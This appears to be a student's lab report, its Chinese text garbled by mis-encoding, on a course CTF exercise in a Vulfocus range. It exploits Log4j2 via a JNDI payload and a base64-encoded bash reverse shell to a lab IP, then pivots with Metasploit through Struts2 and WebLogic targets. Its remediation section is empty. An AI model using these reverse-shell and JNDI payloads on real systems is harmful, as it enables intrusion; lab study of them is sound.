![](https://rockoss-1309912377.cos.ap-beijing.myqcloud.com/picgo/facebook_cover_photo_2.png?q-sign-algorithm=sha1&q-ak=AKIDqVTxW5OWTJyPemjcRMLAl7J1WoulZPDs&q-sign-time=1690287389;9000000000&q-key-time=1690287389;9000000000&q-header-list=host&q-url-param-list=&q-signature=5ad935edc3b23375893975607977b9a25075e3cc)

# 2023æš‘æœŸç½‘ç»œå®‰å…¨æ”»é˜²å®è·µè®°å½•æŠ¥å‘Š

## ğŸ‘¨â€ğŸ’»**è´Ÿè´£å·¥ä½œ**

- åˆ¶å®šåˆ†å·¥è®¡åˆ’
- ä½œä¸ºçº¢é˜Ÿå®Œæˆæ¼æ´å­˜åœ¨æ€§éªŒè¯å’Œæ¼æ´åˆ©ç”¨

- ä½œä¸ºè“é˜Ÿå¯¹æ¼æ´æ”»å‡»è¡Œä¸ºè¿›è¡ŒæŒç»­æ£€æµ‹å’Œå¨èƒè¯†åˆ«ï¼Œå¹¶è¿›è¡Œä¿®å¤

## ğŸš€å®è·µè¿‡ç¨‹

### ç¯å¢ƒæ­å»º

> ä¸‡äº‹å¼€å¤´éš¾ï¼Œåªè¦è‚¯æ”€ç™»

**1.é…ç½®è™šæ‹Ÿæœºï¼Œè°ƒèŠ‚ç½‘ç»œç¯å¢ƒ**

æœ¬æ¬¡å®è·µä¸­ï¼Œè™šæ‹Ÿæœºé…ç½®ä¸¤å¼ ç½‘å¡ï¼š`Host-only`ç½‘å¡å’Œ`ç½‘ç»œåœ°å€è½¬æ¢(NAT)`

<img src="img/virtualnetwork.png" alt="virtualnetwork" style="zoom:50%;" />

å½“ç„¶è¦å®Œæˆçº¢è“æ”»é˜²å¯¹æŠ—ï¼Œéœ€è¦å‡†å¤‡æ”»å‡»è€…ä¸»æœºå’Œé¶æœºï¼Œç›´æ¥ä½¿ç”¨å¤šé‡åŠ è½½é•œåƒï¼Œèƒ½å¤Ÿæœ‰æ•ˆç®€åŒ–æ•´ä¸ªå®éªŒè¿‡ç¨‹ï¼š

<img src="img/windows.png" alt="windows" style="zoom: 67%;" />

åŒæ—¶ä¸ºäº†ä½¿å¾—æŒ‚è½½çš„ä¸¤ä¸ªè™šæ‹Ÿæœºçš„ipåœ°å€ä¸åŒï¼Œå¯ä»¥è‡ªè¡Œæ‰‹åŠ¨æ›´æ–°åœ°å€ï¼š
<img src="img/peizhi.png" alt="peizhi" style="zoom: 50%;" />

**2.ä»ä»“åº“ä¸­æ‹‰å–åˆ°æœ¬æœºçš„è™šæ‹Ÿæœºç³»ç»Ÿå½“ä¸­**ï¼š

åœ¨æ¨¡æ‹Ÿçº¢è“ç½‘ç»œæ”»é˜²å®è·µçš„æ•´ä¸ªè¿‡ç¨‹ä¹‹å‰ï¼Œéœ€è¦ç¡®ä¿æœ¬åœ°ç¯å¢ƒéƒ¨ç½²å®Œæ¯•ï¼Œå½“ç„¶åœ¨é»„è¯å¸ˆå½•åˆ¶å¥½çš„[è§†é¢‘æŒ‡å¯¼](https://www.bilibili.com/video/BV1p3411x7da/?p=22&spm_id_from=pageDriver&vd_source=61a1cf010feeebc60643481f16fc695e)ä¸‹å¯ä»¥å¾ˆå¿«çš„éƒ¨ç½²å®Œèƒ½å¤Ÿçœç•¥å¾ˆå¤šæ¯”è¾ƒç¹ççš„æ“ä½œï¼š

```shell
git clone https://github.com/c4pr1c3/ctf-games.git
```

é€šè¿‡ä½¿ç”¨Docker Composeæ¥æ„é€ dockerç¯å¢ƒï¼Œå…¶ä¸­gitä¸‹æ¥çš„ä»“åº“è€å¸ˆå·²ç»é…ç½®å¥½å¯¹åº”çš„.ymlæ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œå³å¯æ„å»ºå¯¹åº”çš„ç¯å¢ƒï¼š

```shell
sudo apt update && sudo apt install -y docker.io docker-compose jq
```

æ„å»ºå¥½åï¼Œç›´æ¥è¿è¡Œè€å¸ˆç»™å‡ºçš„bashè„šæœ¬å³å¯åœ¨æœ¬åœ°çš„80ç«¯å£å¼€å¯å®¹å™¨ï¼š

<img src="img/container%20build.png" alt="container build" style="zoom:50%;" />

æ­¤å¤„åœ¨è¿è¡Œ`start.sh`è„šæœ¬æ—¶ï¼Œéœ€è¦åœ¨rootç”¨æˆ·æƒé™ä¸‹æ‰§è¡Œï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ° docker ç”¨æˆ·ç»„ï¼Œå… sudo æ‰§è¡Œ docker ç›¸å…³æŒ‡ä»¤ï¼š

```shell
sudo usermod -a -G docker ${USER}
```

å½“ç„¶ä»¥ä¸Šæ­¥éª¤éƒ½éœ€è¦ç¡®ä¿**ç½‘ç»œèƒ½å¤Ÿæ­£å¸¸è¿›è¡Œè®¿é—®**ï¼Œå¦‚æœè®¿é—®æˆ–è€…æ‹‰å–é•œåƒæ—¶å‡ºç°ç½‘ç»œé™åˆ¶æˆ–è€…è¶…æ—¶ï¼Œå¯ä»¥æ›´æ¢dockeré•œåƒæºå’Œkalié•œåƒæºï¼š

- **æ›´æ¢kaliå›½å†…é•œåƒæº**ï¼š

  - ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥ç›´æ¥ç¼–è¾‘`sources.list`

    ```css
    sudo vim /etc/apt/sources.list
    ```

  - æ¢æºåœ°å€å¦‚ä¸‹ï¼š

    ```shell
    # ä¸­ç§‘å¤§
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
     
    # é˜¿é‡Œäº‘
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
     
    # æ¸…åå¤§å­¦
    deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    ```

  - ä¿å­˜æˆåŠŸåå‘½ä»¤è¡Œè¾“å…¥ `sudo apt update`æ›´æ–°è½¯ä»¶æº

    ```shell
    sudo apt update
    ```

- **æ›´æ¢dockeræºï¼š**

  - åˆ›å»ºæˆ–ä¿®æ”¹ /etc/docker/daemon.json æ–‡ä»¶ï¼Œä¿®æ”¹ï¼š

    ```shell
    cd /etc/docker
    vim daemon.json
    ```

    åŠ å…¥å¦‚ä¸‹é…ç½®ï¼š

    ```shell
    {
        "registry-mirrors" : [
        "https://registry.docker-cn.com",
        "http://hub-mirror.c.163.com",
        "https://docker.mirrors.ustc.edu.cn",
        "https://cr.console.aliyun.com",
        "https://mirror.ccs.tencentyun.com"
      ]
    }
    ```

    é‡å¯dockeræœåŠ¡ä½¿é…ç½®ç”Ÿæ•ˆï¼š

    ```shell
    systemctl daemon-reload
    systemctl restart docker.service
    ```

    æŸ¥çœ‹é…ç½®æ˜¯å¦æˆåŠŸï¼š

    ```shell
    docker info
    ```

    <img src="img/dockerpeizhi.png" alt="dockerpeizhi" style="zoom:50%;" />

**3.æµ‹è¯•éƒ¨ç½²æœ¬åœ°çš„Vulfocus**

è¿›å…¥éƒ¨ç½²å¥½çš„åœ°å€ï¼Œèƒ½å¤Ÿçœ‹åˆ°å¯¹åº”çš„é•œåƒåˆ—è¡¨ç­‰ä¿¡æ¯ï¼š

<img src="img/vulfocus-platform.png" alt="vulfocus-platform" style="zoom:50%;" />

åœ¨é•œåƒåˆ—è¡¨åŒæ­¥ä¸Šæ¸¸é•œåƒï¼Œèƒ½å¤Ÿå¾—åˆ°Vulfocuså·²ç»æä¾›çš„é•œåƒï¼š

![cvetest](img/cvetest.png)

<img src="img/mirror%20list.png" alt="mirror list" style="zoom:50%;" />

å°è¯•ä¸‹è½½é•œåƒï¼Œå¹¶åœ¨å®¹å™¨ä¸­å¯åŠ¨ç¯å¢ƒè¿›è¡Œä¸€å®šæµ‹è¯•ï¼š

![start image test](img/start%20image%20test.png)

**4.å¦‚ä½•å»è‡ªå®šä¹‰ä¸€ä¸ªåœºæ™¯æ‹“æ‰‘é•œåƒ**ã€

æˆ‘ä»¬åœ¨æ­å»ºæ•´ä¸ªç½‘ç»œæ”»é˜²çš„æ¨¡æ‹Ÿç¯å¢ƒçš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å»æ„å»ºè·¨ç½‘æ®µæ¸—é€çš„åœºæ™¯é•œåƒï¼Œè€Œç”±äºå®˜ç½‘ï¼ˆ[åœ¨çº¿å¹³å°](https://vulfocus.cn/#/scene/list)ï¼‰å·²ç»ä¸å†æä¾›ä¸‹è½½å’Œèµ„æºé•œåƒåˆ†äº«ï¼Œå› æ­¤éœ€è¦è‡ªå·±å»è®¾è®¡æ„å»ºç›¸åº”çš„æ‹“æ‰‘åœºæ™¯å’Œé•œåƒï¼š

![Download function off](img/Download%20function%20off.png)

æˆ‘ä»¬ç›´æ¥æ‰‹åŠ¨è®¾è®¡åœºæ™¯ï¼Œé¦–å…ˆï¼Œè¦è¾¾æˆè·¨ç½‘æ®µå’Œè¯†åˆ«ï¼Œè¿›å…¥åŠå…¬åŒºå’Œæ ¸å¿ƒåŒºçš„ä»»åŠ¡ï¼Œç®€å•æ¨¡æ‹Ÿå…¶ç¯å¢ƒä¾›ä½¿ç”¨è¿™ä¸€æ¼æ´æ”»é˜²ç¯å¢ƒï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡ä¸¤å¼ ç½‘å¡å®ç°äºŒå±‚ç½‘ç»œçš„æ­å»ºï¼š

![Gateway configuration](img/Gateway%20configuration.png)

æ”»å‡»è€…ä¸»æœºé€šè¿‡æš´éœ²åœ¨â€œå¤–ç½‘â€çš„é¶æœºæ¼æ´ä»è€Œæ¸—é€æ”»å‡»DMZåŒºåŸŸï¼Œå¹¶å°†å…¶ä½œä¸ºè·³æ¿è®¿é—®ï¼Œä¾æ¬¡åˆ©ç”¨æ¼æ´è®¿é—®åˆ°æ ¸å¿ƒç½‘å†…çš„é¶æœºï¼š
![Scene Topology](img/Scene%20Topology.png)

åœ¨å®¹å™¨ä¸­å¯åŠ¨åœºæ™¯ï¼ŒæŸ¥çœ‹ç›¸åº”çš„é•œåƒä¿¡æ¯ï¼š

![The scene started successfully](img/The%20scene%20started%20successfully.png)

å®Œæˆä¸Šè¿°æ­¥éª¤å³æ„å»ºäº†ä¸€ä¸ªåŒå±‚ç½‘æ®µçš„æ¸—é€æµ‹è¯•ç¯å¢ƒçš„æ¨¡æ‹Ÿã€‚

### æ¼æ´éªŒè¯å’Œåˆ©ç”¨

> é›„å…³æ¼«é“çœŸå¦‚é“ï¼Œè€Œä»Šè¿ˆæ­¥ä»å¤´è¶Šã€‚

#### ğŸš©Log4j2-CVE-2021-44228æ¼æ´

##### æ£€æµ‹æ¼æ´å­˜åœ¨æ€§

åœ¨Vulfocuså¯åŠ¨æ¼æ´ç¯å¢ƒï¼Œé•œåƒç®¡ç†ä¸­æœç´¢`Log4j2è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2021-44228ï¼‰`é•œåƒå¹¶ä¸‹è½½ï¼Œå®Œæˆåå¯åŠ¨ï¼š
![Log4j2](img/Log4j2.png)

æµè§ˆå™¨è®¿é—®è¯¥åœ°å€`192.168.56.109:11636`

å®éªŒç¯å¢ƒè®¿é—®ç«¯å£ä¸º11636ï¼Œæ•…æŸ¥çœ‹åˆ°å®¹å™¨åç§°ä¸º`optimistic_blackwell`

è¿›å…¥å®¹å™¨

```bash
docker exec -it optimistic_blackwell bash
```

![intothecontainer](img/intothecontainer.png)

![lsdockercontainer](img/lsdockercontainer.png)

æŸ¥çœ‹åˆ°å®¹å™¨ç›®å½•ä¸‹æœ‰`demo.jar`æ–‡ä»¶ï¼Œæ‹‰å–åˆ°å®¹å™¨çš„å®¿ä¸»æœº

```bash
# docker cp <å®¹å™¨åç§°æˆ–ID>:<å®¹å™¨å†…æ–‡ä»¶è·¯å¾„> <å®¿ä¸»æœºç›®æ ‡è·¯å¾„>
sudo docker cp optimistic_blackwell:/demo/demo.jar ./
```

![pulljarfile](img/pulljarfile.png)

- åç¼–è¯‘


ä½¿ç”¨[jadx](https://github.com/skylot/jadx/releases/tag/v1.4.7)åç¼–è¯‘demo.jar

![decompilejar](img/decompilejar.png)

æºç ä¸­æœ‰åä¸º`Log4j2RceApplic`çš„ç±»ï¼ŒéªŒè¯è¯¥æ¼æ´å­˜åœ¨

##### éªŒè¯æ¼æ´å¯åˆ©ç”¨æ€§

- ä½¿ç”¨ `PoC` æ‰‹åŠ¨æµ‹è¯•

>"PoC" æ˜¯ "Proof of Concept" çš„ç¼©å†™ï¼Œæ„ä¸º"æ¦‚å¿µéªŒè¯"ã€‚åœ¨å®‰å…¨é¢†åŸŸï¼ŒPoC æ‰‹åŠ¨æµ‹è¯•é€šå¸¸ç”¨äºéªŒè¯æ½œåœ¨çš„æ¼æ´æˆ–å®‰å…¨é—®é¢˜ã€‚æµ‹è¯•äººå‘˜ä¼šå°è¯•åˆ©ç”¨å·²çŸ¥çš„æ¼æ´æˆ–æ”»å‡»æŠ€æœ¯æ¥æµ‹è¯•ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå¹¶éªŒè¯æ˜¯å¦å­˜åœ¨æ½œåœ¨çš„é£é™©ã€‚è¿™ç§æµ‹è¯•æ–¹æ³•å¯ä»¥å¸®åŠ©å‘ç°å’Œä¿®å¤ç³»ç»Ÿä¸­çš„å®‰å…¨æ¼æ´ï¼Œä»¥æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚

è®¿é—®http://dnslog.cn/è·å–ä¸“å±éšæœºå­åŸŸå`k5o9u7.dnslog.cn`

![getdomain](img/getdomain.png)

æµè§ˆå™¨è®¿é—®`192.168.56.109:11636/hello?payload=111`åœ°å€ï¼Œä½¿ç”¨Burp Suiteè¿›è¡ŒæŠ“åŒ…ï¼Œä¿®æ”¹GETè¯·æ±‚çš„payloadå‚æ•°

```
# ldap://dnslogè·å–çš„éšæœºåŸŸå/éšä¾¿å¡«
payload=${jndi:ldap://k5o9u7.dnslog.cn/exp}
```

åŒæ—¶å¯¹payloadå­—æ®µè¿›è¡Œ**ç¼–ç **ï¼Œå¦åˆ™ç›´æ¥è®¿é—®ä¼šå¯¼è‡´400é”™è¯¯

![](img/burpget.png)

åœ¨DNSLogç½‘ç«™æˆåŠŸæ¥æ”¶åˆ°è§£æè®°å½•

![](img/getparsingrecord.png)

##### æ¼æ´åˆ©ç”¨

æ”»å‡»è€…ä¸»æœºattackerä¸Šä¸‹è½½[`JNDIExploit`å·¥å…·](https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)

```bash
https://github.com/bkfish/Apache-Log4j-Learning.git
```

è§£å‹

```
unzip JNDIExploit.v1.2.zip
```

æ”»å‡»è€…ä¸»æœºattackerå¯åŠ¨777ç«¯å£ï¼Œç­‰å¾…å—å®³è€…ä¸»æœºvictimåå¼¹å›è¿getshell

```bash
nc -l -p 7777
```

![](img/Startthelisteningport.png)

åº”ç”¨å·¥å…·JNDI-Injection-Exploitæ­å»ºæœåŠ¡ï¼Œæ ¼å¼ï¼š

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C â€œå‘½ä»¤â€ -A â€œipï¼ˆæ”»å‡»æœºï¼‰â€
```

è¿™é‡Œçš„å‘½ä»¤æ˜¯æƒ³è¦é¶æœºè¿è¡Œçš„å‘½ä»¤ï¼Œ-Aåæ”¾çš„æ˜¯å‘å‡ºæ”»å‡»çš„ç”µè„‘çš„ipï¼Œä¹Ÿæ˜¯å­˜æ”¾-Cåâ€œå‘½ä»¤â€çš„ipåœ°å€ã€‚

æ„é€ åå¼¹shellçš„payload

```bash
bash -i >& /dev/tcp/192.168.56.105/7777 0>&1
```

å°†å…¶è¿›è¡Œbase64åŠ å¯†

```tex
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=
```

æ‰§è¡ŒJNDI-Injection-Exploit

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.56.105
```

![](img/Startjavamonitoring.png)

ä½¿ç”¨Burp Suiteè¿›è¡ŒæŠ“åŒ…ï¼Œä¿®æ”¹`GET 192.168.56.107:28490/hello?payload=111`çš„payloadå‚æ•°ä¸ºä¸Šå›¾æ¡†é€‰çš„å†…å®¹å¹¶è¿›è¡Œç¼–ç 

```
${jndi:rmi://192.168.56.105:1099/5ekovi}
```

![](img/Modifypayloadparameters.png)

å‘é€åï¼Œå³å¯å‘ç°æ”»å‡»è€…ä¸»æœºçš„ç›‘å¬çª—å£åå¼¹shell

![](img/bounceshellwindow.png)

æŸ¥çœ‹flag

```bash
ls /temp
```

![](img/getflag1.png)

```bash
flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
```

åœ¨ç®¡ç†ç•Œé¢æäº¤è¯¥flagé€šè¿‡

![](img/getflag2.png)

### å¤šç½‘æ®µæ¸—é€åœºæ™¯æ”»é˜²

#### ğŸš©å¤–å±‚ï¼ˆé¶æœº 1ï¼‰

ä»æ¨¡æ‹Ÿæ˜¾ç¤ºçš„è§’åº¦æ¥è€ƒè™‘ï¼Œæœ€å¤–å±‚çš„ä¸»æœºè´Ÿè´£å¯¹å¤–æä¾›æœåŠ¡ï¼Œäºæ˜¯ç›´æ¥å¾—åˆ°äº†æä¾›æœåŠ¡çš„ç«¯å£å·ï¼Œä¹Ÿå°±æ˜¯vulfocuså¹³å°ä¸Šåœºæ™¯çš„å…¥å£ç«¯å£

##### CVE-2020-17530 Struts2

æˆ‘ä»¬å¯åŠ¨åœºæ™¯åï¼ŒæŸ¥çœ‹å½“å‰è¿è¡Œçš„é•œåƒï¼š

![dockerps](img/dockerps.png)

èƒ½å¤Ÿçœ‹åˆ°åœ¨Host-onlyç½‘å¡çš„æœ¬åœ°åœ°å€çš„58841ç«¯å£å¼€å¯äº†`CVE-2020-17530 Struts2`çš„é¶åœºç¯å¢ƒï¼Œ

![attackcore](img/attackcore.png)

åˆ‡æ¢åˆ°æ”»å‡»è€…ä¸»æœºå¹¶æ‰§è¡Œï¼š

```shell
# metasploit åŸºç¡€é…ç½®
# æ›´æ–° metasploit
sudo apt install -y metasploit-framework
# åˆå§‹åŒ– metasploit æœ¬åœ°å·¥ä½œæ•°æ®åº“
sudo msfdb init
```

![datalab](img/datalab.png)

```shell
# å¯åŠ¨ msfconsole
msfconsole
# ç¡®è®¤å·²è¿æ¥ pgsql
db_status
# å»ºç«‹å·¥ä½œåŒº
workspace -a demo
```

![metasploit](img/metasploit.png)

é€šè¿‡Metasploitå·¥å…·çš„å¹³å°æœç´¢struts2æœç´¢CVE-2020-17530ï¼Œå¦‚æœæ˜¯å‰è€…çš„è¯éœ€è¦è¿›è¡Œä¸€ç‚¹è‚‰çœ¼ç­›é€‰ï¼Œè¿™æ¬¡çš„æ¼æ´ç¼–å·è¯´æ˜æ˜¯2020å¹´çš„æ¼æ´ï¼Œäºæ˜¯å¯ç”¨çš„exploitåªæœ‰2020å¹´9æœˆ14æ—¥çš„ï¼š

```shell
Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/http/struts_code_exec_parameters
msf6 > search cve-2020-17530

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/struts2_multi_eval_ognl
```

ä¹‹åå°±æ˜¯é€‰ç”¨exploitï¼Œç„¶åæ·»åŠ payloadï¼Œè¿™é‡Œé€‰æ‹©å’Œè¯¾ä»¶ä¸­ä¸€æ ·çš„`cmd/unix/reverse_bash`ï¼Œéšåæ˜¯optionsçš„è®¾ç½®é˜¶æ®µï¼Œè®¾ç½®rhostsä¸ºVictimä¸»æœºçš„eth0ç½‘å¡åœ°å€ï¼Œrportåˆ™ä¸ºå¹³å°ä¸Šéšæœºçš„ç«¯å£ï¼ŒåŒæ—¶å°†payloadä¸­çš„lhostè®¾ç½®ä¸ºAttackerä¸»æœºçš„Host-Onlyç½‘å¡ï¼Œä¹‹åå°±å‰©ä¸‹è¾“å…¥runæˆ–è€…exploitæ‰§è¡Œã€‚

éšååªéœ€è¦ç­‰å¾…exploitè¿è¡Œå®Œæˆï¼Œpayloadä¸­çš„åå¼¹bashä¼šè‡ªåŠ¨å¼€å¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯`ls /tmp`æŸ¥çœ‹flagäº†ï¼š

![attack](img/attack.png)

#### ğŸš©ä¸­å±‚ï¼ˆé¶æœº 2-4ï¼‰

##### weblogic-cve-2019-2725

å½“æ‹¿åˆ°å¤–å±‚ä¸»æœºçš„shellä¹‹åæ˜¯éœ€è¦å¯¹å¤–å±‚ä¸»æœºæ‰€åœ¨å†…éƒ¨ç½‘ç»œè¿›è¡Œæ‰«æï¼Œå°è¯•æ‰¾å‡ºè¿›ä¸€æ­¥å‘æ·±å±‚è¿›å‘çš„è·³æ¿ä¸»æœºï¼Œéœ€è¦åšçš„5ä¸ªæ­¥éª¤å¤§æ¦‚æ˜¯å¦‚ä¸‹å†…å®¹ï¼š

1. å¯¹å·²æ”»å…¥ä¸»æœºæ‰€åœ¨å†…ç½‘ç½‘æ®µä¸­å…¶ä»–ä¸»æœºè¿›è¡Œå­˜æ´»éªŒè¯

2. å¯¹å­˜æ´»çš„å…¶ä»–ä¸»æœºè¿›è¡Œç«¯å£æ‰«æ

3. å¯¹å·²å¼€æ”¾ç«¯å£å·è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¾—åˆ°å¼€æ”¾çš„æœåŠ¡çš„ä¿¡æ¯

4. ä»å¼€æ”¾çš„æœåŠ¡å…¥æ‰‹è·å–ç‰ˆæœ¬å¯»æ‰¾å¯ç”¨çš„æ¼æ´

5. ç¡®å®šæ¼æ´ï¼Œè£…è½½payloadï¼Œexploit

é¦–å…ˆæ˜¯å°†å·²ç»è·å¾—çš„1å·ä¼šè¯å³å¤–å±‚ä¸»æœºshellå‡çº§ä¸ºmeterpreterï¼Œè¯´æ˜¯å‡çº§å¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿæ˜¯`sessions -u 1`ï¼Œå…¶å®æ˜¯é€šè¿‡ä¸Šä¼ åä¸º`post/multi/manage/shell_to_meterpreter`çš„payloadçš„æ–¹å¼å¼€å¯æ›´å¤šåŠŸèƒ½çš„ä¼šè¯ï¼š

```shell
Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)

```

ä¸»è¦çš„è¿˜æ˜¯éœ€è¦ç”¨meterpreterå®ç°è®©å¤–å±‚çš„ä¸»æœºä½œä¸ºä¸­ä»‹è·¯ç”±ï¼Œå°†ä¸‹ä¸€æ­¥å†…ç½‘æ‰«æçš„åŒ…è½¬å‘è¿‡å»ï¼Œæ­¤æ—¶ä¼šç”¨åˆ°`post/multi/manage/autoroute`æ¨¡å—ï¼Œåªéœ€è¦å°†ä¼šè¯IDå¡«å…¥å³å¯ï¼Œä¹‹åè¿è¡Œä¾¿ä¼šè‡ªåŠ¨æ·»åŠ è·¯ç”±ä¿¡æ¯åˆ°Metasploitçš„è·¯ç”±è¡¨ä¸­ï¼š

```shell
Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  2                yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 192.171.84.4
[*] Searching for subnets to autoroute.
[*] Did not find any new subnets to add.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.171.84.0       255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

ä¹‹åçš„é¡ºåºåº”è¯¥ä¸ºå…ˆè¿›è¡Œå­˜æ´»éªŒè¯åè¿›è¡Œç«¯å£æ‰«æï¼Œå¦‚æ­¤å¯ä»¥é€šè¿‡å­˜æ´»æ€§ç­›é™¤æ‰ä¸å¿…è¦çš„IPåœ°å€ï¼Œå¯ä»¥è®©ç«¯å£æ‰«ææ›´å¿«é€Ÿæ›´é«˜æ•ˆï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨æ¨¡å—`post/multi/gather/ping_sweep`ï¼Œå¡«å…¥å¿…è¦çš„optionsä¹‹åå°±å¯ä»¥è¿›è¡Œæ‰«æäº†ï¼š

```shell
Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/gather/ping_sweep) > set rhosts 192.171.84.2-254
rhosts => 192.171.84.2-254
msf6 post(multi/gather/ping_sweep) > set session 2
session => 2
msf6 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 192.171.84.2-254
[+]     192.171.84.5 host found
[+]     192.171.84.3 host found
[+]     192.171.84.4 host found
[+]     192.171.84.2 host found
[*] Post module execution completed
```

#### ğŸš©å†…å±‚ï¼ˆé¶æœº 5ï¼‰

##### nginx-php-flag

å†…å±‚ä¸€æ ·éœ€è¦æ‰¾åˆ°è·³æ¿ä¸»æœºè®¿é—®åˆ°å†…å±‚ç½‘ç»œï¼Œé€šè¿‡å‡çº§æ™®é€šä¼šè¯åˆ°meterpreterï¼Œéšåæ­å»ºautorouteæ·»åŠ è·¯ç”±è¡¨ï¼Œéšåè¿›è¡Œå­˜æ´»æ€§æ‰«æï¼Œå†è€…æ˜¯ç«¯å£æ‰«æã€‚

é¦–å…ˆæ˜¯å‡çº§ä¼šè¯å’Œæ‰¾åˆ°è¿æ¥å†…å±‚ç½‘ç»œçš„è·³æ¿ä¸»æœºï¼Œè¿™é‡Œå› ä¸ºå¼€å¤ªå¤šå®¹å™¨å’Œè™šæ‹Ÿæœºçš„é—®é¢˜å›è¿é€Ÿåº¦ç•¥æ…¢å¯¼è‡´äº§ç”Ÿäº†æŠ¥é”™ï¼Œå³å‰ä¸€ä¼šè¯ä»åœ¨ç­‰å¾…4433ç«¯å£çš„å›åº”æ—¶ä¸‹ä¸€ä¼šè¯çš„payloadå·²ç»å‘é€è¿‡å»å¯¼è‡´æœ¬åœ°ç«¯å£å†²çªäº†ï¼Œä¸è¿‡ä¸å½±å“ï¼Œä½¿ç”¨`jobs -l`ç¡®è®¤åå°æ‰§è¡Œå®Œæˆå3ä¸ªä¼šè¯éƒ½å‡çº§åˆ°äº†meterpreterï¼š

```shell
  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
  3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60640 (192.171.84.2)
  4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60630 (192.171.84.3)
  5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60574 (192.171.84.5)
  6         meterpreter x86/linux  root @ 192.171.84.2  192.168.56.107:4433 -> 192.168.56.1:60622 (192.171.84.2)

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 6
[*] Starting interaction with 6...
```

å¾—åˆ°è¾“å‡ºç»“æœï¼Œå¹¶ä¸”æç¤ºæˆ‘ä»¬éœ€è¦é€šè¿‡ `index.php?cmd=ls /tmp` çš„æ–¹å¼æ‰§è¡Œï¼Œæœ€åæˆåŠŸå¾—åˆ° `flag5`ï¼š

```shell
View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/portscan/tcp) > set ports 80
ports => 80
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.172.85.2-3
rhosts => 192.172.85.2-3
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.172.85.2:         - 192.172.85.2:80 - TCP OPEN
[*] 192.172.85.2-3:       - Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >
```

![completed](img/completed.png)

### æ¼æ´å¨èƒç›‘æµ‹å’Œç¼“è§£ä¿®å¤

> æ¬²ç©·åƒé‡Œç›®ï¼Œæ›´ä¸Šä¸€å±‚æ¥¼

#### weblogic-cve-2019-2725æ¼æ´ä¿®å¤

